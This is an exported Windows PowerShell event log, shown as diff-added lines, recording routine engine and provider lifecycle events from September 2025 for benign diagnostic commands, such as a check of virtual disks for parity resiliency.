+	CommandLine="
+Information,9/22/2025 9:29:32 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=705c3eac-d2c3-4967-894e-47c069274c39
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=4d4b7bce-0408-422e-9330-5da6d91f28ba
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:21 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=705c3eac-d2c3-4967-894e-47c069274c39
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=4d4b7bce-0408-422e-9330-5da6d91f28ba
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=705c3eac-d2c3-4967-894e-47c069274c39
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=705c3eac-d2c3-4967-894e-47c069274c39
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=705c3eac-d2c3-4967-894e-47c069274c39
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=705c3eac-d2c3-4967-894e-47c069274c39
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=705c3eac-d2c3-4967-894e-47c069274c39
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=705c3eac-d2c3-4967-894e-47c069274c39
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:20 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=5ecdfa9b-a1b7-466f-99cb-fc170171178c
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=ae1aa983-b6ee-45b9-83b8-8364ea358af7
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:18 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=5ecdfa9b-a1b7-466f-99cb-fc170171178c
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=ae1aa983-b6ee-45b9-83b8-8364ea358af7
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:17 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=5ecdfa9b-a1b7-466f-99cb-fc170171178c
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:17 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=5ecdfa9b-a1b7-466f-99cb-fc170171178c
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:17 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=5ecdfa9b-a1b7-466f-99cb-fc170171178c
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:17 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=5ecdfa9b-a1b7-466f-99cb-fc170171178c
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:17 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=5ecdfa9b-a1b7-466f-99cb-fc170171178c
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/22/2025 9:29:17 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=5ecdfa9b-a1b7-466f-99cb-fc170171178c
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/21/2025 12:37:39 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e8ad2e65-a162-4208-bae7-0cfdf124d122
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.17763.2931
+	RunspaceId=9ea00d05-4696-404b-aee6-27cf32532c29
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/21/2025 12:37:39 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e8ad2e65-a162-4208-bae7-0cfdf124d122
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/21/2025 12:37:39 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e8ad2e65-a162-4208-bae7-0cfdf124d122
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/21/2025 12:37:39 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e8ad2e65-a162-4208-bae7-0cfdf124d122
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/21/2025 12:37:39 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e8ad2e65-a162-4208-bae7-0cfdf124d122
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/21/2025 12:37:39 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e8ad2e65-a162-4208-bae7-0cfdf124d122
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/21/2025 12:37:39 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e8ad2e65-a162-4208-bae7-0cfdf124d122
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:58 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=854f649e-e0a6-49da-9b79-90917858f97e
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=c345e81d-f808-437b-89f2-90c4be0a7860
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:49 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=854f649e-e0a6-49da-9b79-90917858f97e
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=c345e81d-f808-437b-89f2-90c4be0a7860
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:49 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=854f649e-e0a6-49da-9b79-90917858f97e
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:49 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=854f649e-e0a6-49da-9b79-90917858f97e
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:49 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=854f649e-e0a6-49da-9b79-90917858f97e
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:49 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=854f649e-e0a6-49da-9b79-90917858f97e
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:49 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=854f649e-e0a6-49da-9b79-90917858f97e
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:49 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=854f649e-e0a6-49da-9b79-90917858f97e
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:48 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f9fd9fea-dae4-4d9a-aa58-4a1954c26e97
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=fd8314d8-1bda-4d90-8f0a-cd0e460c71cb
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:47 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f9fd9fea-dae4-4d9a-aa58-4a1954c26e97
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=fd8314d8-1bda-4d90-8f0a-cd0e460c71cb
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:46 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f9fd9fea-dae4-4d9a-aa58-4a1954c26e97
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:46 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f9fd9fea-dae4-4d9a-aa58-4a1954c26e97
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:46 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f9fd9fea-dae4-4d9a-aa58-4a1954c26e97
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:46 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f9fd9fea-dae4-4d9a-aa58-4a1954c26e97
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:46 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f9fd9fea-dae4-4d9a-aa58-4a1954c26e97
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 4:41:46 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f9fd9fea-dae4-4d9a-aa58-4a1954c26e97
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 3:46:34 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b66ac62b-f75a-444c-bb03-30866a95516a
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.17763.2931
+	RunspaceId=053cb474-6a1e-4835-9a4d-977f73dcb2ea
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 3:46:33 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b66ac62b-f75a-444c-bb03-30866a95516a
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 3:46:33 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b66ac62b-f75a-444c-bb03-30866a95516a
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 3:46:33 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b66ac62b-f75a-444c-bb03-30866a95516a
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 3:46:33 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b66ac62b-f75a-444c-bb03-30866a95516a
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 3:46:33 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b66ac62b-f75a-444c-bb03-30866a95516a
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/20/2025 3:46:33 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b66ac62b-f75a-444c-bb03-30866a95516a
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,9/19/2025 1:06:29 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=62c20e4a-5efd-4cda-ae1b-285bc77afb20
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=5.1.17763.2931
+	RunspaceId=d68334a2-af49-425a-9a01-c90b54ef2ce8
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
